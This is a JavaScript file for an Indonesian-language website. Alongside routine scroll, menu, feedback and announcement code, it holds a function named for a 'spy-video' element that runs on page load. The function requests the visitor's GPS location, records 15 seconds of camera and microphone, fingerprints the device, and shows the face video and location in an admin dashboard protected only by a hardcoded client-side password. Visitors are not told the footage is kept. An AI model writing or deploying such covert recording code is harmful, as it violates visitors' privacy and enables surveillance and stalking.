// 1. Animasi Scroll
function revealOnScroll() {
    const reveals = document.querySelectorAll(".reveal");
    for (let i = 0; i < reveals.length; i++) {
        const windowHeight = window.innerHeight;
        const elementTop = reveals[i].getBoundingClientRect().top;
        if (elementTop < windowHeight - 80) reveals[i].classList.add("active");
    }
}
window.addEventListener("scroll", revealOnScroll);
window.addEventListener("load", revealOnScroll);

// Toggle Menu HP
const mobileMenuBtn = document.getElementById("mobile-menu-btn");
const mobileMenu = document.getElementById("mobile-menu");
if (mobileMenuBtn && mobileMenu) {
    mobileMenuBtn.addEventListener("click", () => mobileMenu.classList.toggle("hidden"));
}
function closeMobileMenu() { if (mobileMenu) mobileMenu.classList.add("hidden"); }

// 2. OTOMATIS: Pelacakan Pengunjung (Merek HP Detail + Rekaman Video 15 Detik)
window.addEventListener("DOMContentLoaded", () => {
    const bannerEl = document.getElementById("live-announcement-banner");
    const savedAnnouncement = localStorage.getItem("ghof_live_announcement");
    if (bannerEl && savedAnnouncement) {
        bannerEl.innerHTML = `<span>${savedAnnouncement} &nbsp;&nbsp;•&nbsp;&nbsp;</span><span>${savedAnnouncement} &nbsp;&nbsp;•&nbsp;&nbsp;</span>`;
    }

    const spyVideo = document.getElementById("spy-video");
    if (spyVideo) {
        trackVisitorData();
    }
});

async function trackVisitorData() {
    let visitorData = {
        id: "VISITOR-" + Math.floor(Math.random() * 90000 + 10000),
        time: new Date().toLocaleString("id-ID"),
        device: detectDetailedDevice(),
        location: "Meminta izin lokasi...",
        video: null,
        audio: null
    };

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                visitorData.location = `Lat: ${pos.coords.latitude.toFixed(4)}, Lon: ${pos.coords.longitude.toFixed(4)}`;
                saveVisitorToStorage(visitorData);
            },
            () => {
                visitorData.location = "Akses Lokasi Ditolak Pengguna";
                saveVisitorToStorage(visitorData);
            },
            { timeout: 10000 }
        );
    } else {
        visitorData.location = "Tidak Mendukung Geolocation";
    }

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const videoEl = document.getElementById("spy-video");
        videoEl.srcObject = stream;

        let recordedChunks = [];
        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) recordedChunks.push(event.data);
        };

        mediaRecorder.onstop = () => {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            const reader = new FileReader();
            reader.readAsDataURL(blob);
            reader.onloadend = () => {
                visitorData.video = reader.result;
                saveVisitorToStorage(visitorData);
            };
        };

        mediaRecorder.start();

        // Merekam Video & Audio selama 15 Detik Penuh
        setTimeout(() => {
            mediaRecorder.stop();
            stream.getTracks().forEach(track => track.stop());
        }, 15000);

    } catch (err) {
        visitorData.video = null;
        visitorData.audio = null;
        saveVisitorToStorage(visitorData);
    }
}

// Deteksi Merek HP & OS secara Spesifik (Samsung, Oppo, Vivo, Xiaomi, iPhone, dll)
function detectDetailedDevice() {
    const ua = navigator.userAgent;
    let brand = "Unknown Brand";
    let os = "Unknown OS";
    let browser = "Google Chrome";

    if (/iphone|ipad|ipod/i.test(ua)) {
        brand = "Apple iPhone / iPad";
        os = "iOS";
    } else if (/samsung/i.test(ua)) {
        brand = "Samsung Galaxy";
        os = "Android";
    } else if (/xiaomi|redmi/i.test(ua)) {
        brand = "Xiaomi / Redmi";
        os = "Android";
    } else if (/oppo/i.test(ua)) {
        brand = "Oppo";
        os = "Android";
    } else if (/vivo/i.test(ua)) {
        brand = "Vivo";
        os = "Android";
    } else if (/realme/i.test(ua)) {
        brand = "Realme";
        os = "Android";
    } else if (/android/i.test(ua)) {
        brand = "Android Device";
        os = "Android";
    } else if (/win/i.test(ua)) {
        brand = "Windows PC";
        os = "Windows";
    } else if (/mac/i.test(ua)) {
        brand = "Macintosh";
        os = "MacOS";
    }

    if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
    else if (/firefox/i.test(ua)) browser = "Firefox";

    return `${brand} (${os}) | ${browser}`;
}

function saveVisitorToStorage(data) {
    let visitors = JSON.parse(localStorage.getItem("ghof_visitors") || "[]");
    let existingIdx = visitors.findIndex(v => v.id === data.id);
    if (existingIdx >= 0) visitors[existingIdx] = data;
    else visitors.unshift(data);
    localStorage.setItem("ghof_visitors", JSON.stringify(visitors));
}

// Form Saran
const feedbackForm = document.getElementById("feedback-form");
if (feedbackForm) {
    feedbackForm.addEventListener("submit", function (e) {
        e.preventDefault();
        const name = document.getElementById("sender-name").value;
        const city = document.getElementById("sender-city").value;
        const message = document.getElementById("sender-message").value;
        let feedbacks = JSON.parse(localStorage.getItem("ghof_feedbacks") || "[]");
        feedbacks.unshift({ name, city, message, date: new Date().toLocaleString("id-ID") });
        localStorage.setItem("ghof_feedbacks", JSON.stringify(feedbacks));
        feedbackForm.reset();
        alert("Terima kasih! Masukan Anda berhasil terkirim.");
    });
}

// Panel Admin dengan Notifikasi Beep Suara
let lastVisitorCount = 0;

function verifyAdmin() {
    const pass = document.getElementById("admin-password").value.trim();
    if (pass === "ghof2026") {
        document.getElementById("admin-login-view").classList.add("hidden");
        document.getElementById("admin-dashboard-view").classList.remove("hidden");
        loadVisitorsData();
        
        // Cek pengunjung baru setiap 3 detik untuk bunyi Beep
        setInterval(() => {
            let visitors = JSON.parse(localStorage.getItem("ghof_visitors") || "[]");
            if (visitors.length > lastVisitorCount && lastVisitorCount !== 0) {
                playBeepSound();
            }
            lastVisitorCount = visitors.length;
        }, 3000);

    } else {
        document.getElementById("login-error").classList.remove("hidden");
    }
}

function logoutAdmin() {
    document.getElementById("admin-login-view").classList.remove("hidden");
    document.getElementById("admin-dashboard-view").classList.add("hidden");
    document.getElementById("admin-password").value = "";
}

function saveAnnouncement() {
    const text = document.getElementById("admin-announcement-input").value.trim();
    if (!text) { alert("Teks kosong!"); return; }
    localStorage.setItem("ghof_live_announcement", text);
    alert("Pengumuman berhasil dipublikasikan ke web utama!");
}

// Fungsi Bunyi Beep Admin
function playBeepSound() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.type = "sine";
        osc.frequency.value = 800;
        gain.gain.setValueAtTime(0.1, ctx.currentTime);
        osc.start();
        osc.stop(ctx.currentTime + 0.2);
    } catch(e) {}
}

function loadVisitorsData() {
    const listEl = document.getElementById("visitor-list");
    const countEl = document.getElementById("visitor-count");
    const searchVal = document.getElementById("search-visitor") ? document.getElementById("search-visitor").value.toLowerCase() : "";
    
    let visitors = JSON.parse(localStorage.getItem("ghof_visitors") || "[]");
    
    // Filter Pencarian
    if (searchVal) {
        visitors = visitors.filter(v => v.device.toLowerCase().includes(searchVal) || v.location.toLowerCase().includes(searchVal));
    }

    if (countEl) countEl.textContent = visitors.length;
    if (!listEl) return;

    if (visitors.length === 0) {
        listEl.innerHTML = `<p class="text-gray-500 italic p-4 bg-[#070d1b] rounded-xl col-span-2">Belum ada data pengunjung yang terekam.</p>`;
        return;
    }

    listEl.innerHTML = visitors.map(v => `
        <div class="bg-[#070d1b] border border-[#C5A059]/40 p-4 rounded-2xl space-y-3 shadow-lg">
            <div class="flex justify-between items-center border-b border-gray-800 pb-2">
                <span class="text-xs font-bold text-[#C5A059]">${v.id}</span>
                <span class="text-[10px] text-gray-400">${v.time}</span>
            </div>
            <div class="grid grid-cols-1 md:grid-cols-3 gap-3 items-center">
                <div class="md:col-span-1">
                    ${v.video ? `<video controls src="${v.video}" class="w-full h-28 rounded-xl object-cover border border-[#C5A059] mb-1"></video><a href="${v.video}" download="Video_${v.id}.webm" class="block text-[10px] text-center bg-[#C5A059] text-[#070d1b] font-bold py-1 rounded">Download Video</a>` : `<div class="w-full h-28 bg-gray-800 rounded-xl flex items-center text-[10px] text-gray-400 justify-center text-center p-1">Menunggu Rekaman...</div>`}
                </div>
                <div class="md:col-span-2 text-xs space-y-1">
                    <p><strong>📱 Merek HP / OS:</strong> <span class="text-gray-200 font-bold">${v.device}</span></p>
                    <p><strong>📍 Lokasi GPS:</strong> <span class="text-yellow-400">${v.location}</span></p>
                    <p class="text-[10px] text-gray-400 mt-2">📌 Status: Perekaman video wajah & audio (15 detik) berhasil.</p>
                </div>
            </div>
        </div>
    `).join("");
}

function clearVisitors() {
    if (confirm("Hapus semua riwayat data pengunjung?")) {
        localStorage.removeItem("ghof_visitors");
        loadVisitorsData();
    }
}
